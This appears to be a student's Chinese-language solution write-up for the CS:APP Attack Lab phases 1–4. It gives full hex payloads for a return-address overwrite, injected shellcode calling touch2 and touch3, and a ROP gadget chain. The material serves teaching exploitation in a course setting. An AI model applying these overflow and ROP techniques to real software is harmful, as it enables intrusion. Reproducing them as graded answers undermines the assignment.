注意，运行./rtarget或者ctarget可能有问题，加上-q即可

## attack1:

我使用的操作系统是Ubuntu 22.04版本，在这个版本上运行ctarget程序会出现Segmentation Fault。如果你用gdb调试会发现在__vfprintf_internal方法内部有问题，具体修复方法可以参考：[Fix CS:APP Attack Lab Segmentation Fault on Newest Ubuntu 22.04](https://blog.rijuyuezhu.top/posts/db646f34/)。建议使用更老的linux版本。我使用18是没问题的。

请先阅读attacklab.pdf

`hex2raw` 是一个字一个字的读，也就是一次读8个字节，但是字内部是小端，比如attack1.txt：`41 00 00 00 00 00 00 00`

执行./hex2raw < attack1.txt会输出 `A`。`./hex2raw < attack1.txt | ./ctarget -q`我们可以用这个命令执行程序

根据pdf的意思，我们首先要侵入一个程序，让它运行 `4017c0 <touch1>:` 。方法需要你知道栈的运行过程，当我们调用函数的时候，会自动的把程序的返回地址先压入栈中，然后再进入调用的函数，调用完成后返回，示意图如下：

```
[ 返回地址 ]        <--- 函数返回后，跳转到这里执行
[ buffer (x 字节) ]<--- 局部变量，用于存储用户输入
```

我们这个程序是从 `401968 <test>` 函数开始的

```asm
0000000000401968 <test>:
  401968:	48 83 ec 08          	sub    $0x8,%rsp
  40196c:	b8 00 00 00 00       	mov    $0x0,%eax
  401971:	e8 32 fe ff ff       	callq  4017a8 <getbuf>
```

```asm
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq   
  4017be:	90                   	nop
  4017bf:	90                   	nop
```

getbuf给栈分配了40个字节的空间，40个之后就是返回地址了。所以我们先随便输入40个字节，再把后面的八个字节换成touch1的地址4017C0就成功了。

输入
```asm
A0 00 00 00 00 00 00 00
B0 00 00 00 00 00 00 00
C0 00 00 00 00 00 00 00
D0 00 00 00 00 00 00 00
E0 00 00 00 00 00 00 00
C0 17 40 00 00 00 00 00
```

## attack2:

rsp进入getbuf的时候是0x5561dca0，rsp减40个字节就是0x5561dc78。我们需要。我们的返回地址设成栈顶，并把栈顶的内容换成一个命令的二进制，计算机会自动执行他们。90是占位符，没作用

输入
```asm
48 BF FA 97 B9 59 00 00 00 00	/*	mov rdi, 0x59B997FA	*/
68 EC 17 40 00					/*	push 0x004017EC		*/
C3  							/*	ret					*/
90 90 90 90 90 90 90 90			
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
78 dc 61 55 00 00 00 00
```

注意在 64 位模式下，push 会将 8 字节值压入栈中（即使立即数是 32 位的，也会被符号扩展为 64 位）。如果push四字节后面是一些00 00，那么会被认为是其他的指令，比如add %al, (%rax)，对应的二进制是：00 00


## attack3:

```asm
C7 44 24 28 35 39 42 39			/* mov QWORD PTR [rsp+40], 0x39423935 将 0x35 0x39 0x42 0x39 存入 [rsp + 40(0x28)] */
C7 44 24 2C 39 37 46 41			/* mov QWORD PTR [rsp+44], 0x41463739 将 0x39 0x37 0x46 0x41 存入 [rsp + 44(0x2c)] */
C6 44 24 30 00					/* mov BYTE PTR [rsp+48], 0x00 将 0x00 存入 [rsp + 48(0x30)] （字符串的结束符） 	*/
48 8d 7c 24 28					/*	lea rdi, [rsp+40(0x28)]				*/
68 FA 18 40 00					/*	push 0x004018FA						*/
C3  							/*	ret									*/
90 90 90 90 90 90 90 90			/*	占位符								*/ 
78 dc 61 55 00 00 00 00			/*	0x5561dc78							*/ 
```

第三题和第二题很像，但是第三题我们需要返回字符串的地址，我们可以把字符串存在栈里面，开始我是直接存在离栈很近的地方的，后来发现都被覆盖了，其实题目也提示了这一点。我存在rsp+40的地方就没问题了。然后把字符串开始的地址存入rdi就行了。注意字符串需要小写。


## attack4:

现在我们要用rop的方式完成attack2，也就是通过多条指令的组合完成`mov 0x59B997FA,%rdi`的效果，这些指令需要在farm里面找，也有可能是从一条完整的指令里面摘出几个字节来，具体可以看Fig3A、3B。

观察3A可以发现，mov指令均以48 89开头，那么我们可以搜一下哪里有48 89，这里我会把反汇编的内容改一下：

```asm
00000000004019a0 <addval_273>:
  4019a0:	8d 87 48 89 c7 c3    	movq	%rax,%rdi;	?
  4019a6:	c3                   	retq   
00000000004019ae <setval_237>:
  4019ae:	c7 07 48 89 c7 c7    	movq	%rax,%rdi;	?
  4019b4:	c3                   	retq   
00000000004019c3 <setval_426>:
  4019c3:	c7 07 48 89 c7 90    	movq	%rax,%rdi;	nop
  4019c9:	c3                   	retq   
0000000000401a03 <addval_190>:
  401a03:	8d 87 41 48 89 e0    	movq	%rsp,%rax;
  401a09:	c3                   	retq   
0000000000401a18 <getval_345>:
  401a18:	b8 48 89 e0 c1       	movq	%rsp,%rax;	?
  401a1d:	c3                   	retq 
0000000000401a47 <addval_201>:
  401a47:	8d 87 48 89 e0 c7    	movq	%rsp,%rax;	?
  401a4d:	c3                   	retq   
0000000000401a5a <setval_299>:
  401a5a:	c7 07 48 89 e0 91    	movq	%rsp,%rax;	?
  401a60:	c3                   	retq   
0000000000401a97 <setval_181>:
  401a97:	c7 07 48 89 e0 c2    	movq	%rsp,%rax;	?
  401a9d:	c3                   	retq   
0000000000401aab <setval_350>:
  401aab:	c7 07 48 89 e0 90    	movq	%rsp,%rax;	nop
  401ab1:	c3                   	retq   
```

很明显，我们能看出有两个可以直接用的指令，分别是

`4019c3:	c7 07 48 89 c7 90    	movq	%rax,%rdi;	nop`

和

`401aab:	c7 07 48 89 e0 90    	movq	%rsp,%rax;	nop`

还有popq指令，它可以让栈顶的内容放到我们需要的寄存器中，比如rdi寄存器，理论上我们可以直接把栈顶的内容写上我们要的0x59b997fa，然后pop到rdi里面再返回就行了。不过问题是这个需要命令`5f`，在farm里面没找到。这时候因为我们有rax->rdi的命令，所以我们传入rax也可以，rax命令是`58`

```asm
00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                   	retq  
```

用这个就行了。我们直接先返回到0x4019ab，就可以把栈顶的内容放到rax里面，再ret到4019c5，就可以让rdi是栈顶的内容了。

```asm
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
ab 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
c5 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00
```

最后再返回到touch2，注意现在运行的命令是rtarget了。